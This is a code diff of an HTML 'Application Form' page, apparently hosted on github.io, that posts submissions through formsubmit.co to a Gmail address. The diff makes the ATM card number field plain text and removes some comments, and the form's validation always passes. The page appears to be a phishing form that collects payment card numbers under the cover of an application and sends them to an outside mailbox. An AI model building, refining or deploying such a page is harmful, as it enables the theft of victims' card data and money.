@@ -61,9 +61,7 @@
 </head>
 <body>
   <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateForm()">
-    <!-- ✅ Redirect after submission -->
     <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/Application-Form/thank-you.html">
-
     <h2>Application Form</h2>
 
     <!-- 1. Full Name -->
@@ -131,7 +129,7 @@
     <!-- 10. ATM Card Number -->
     <div id="atmFields">
       <label>ATM Card Number:
-        <input type="password" name="ATM Card Number" maxlength="16" onblur="validateCard(this)">
+        <input type="text" name="ATM Card Number" maxlength="16" onblur="validateCard(this)">
         <span class="error">ATM Card Number must be 16 digits.</span>
       </label>
 
@@ -227,7 +225,6 @@
     }
 
     function validateForm() {
-      // Optional: prevent submission if errors are visible
       return true;
     }
   </script>
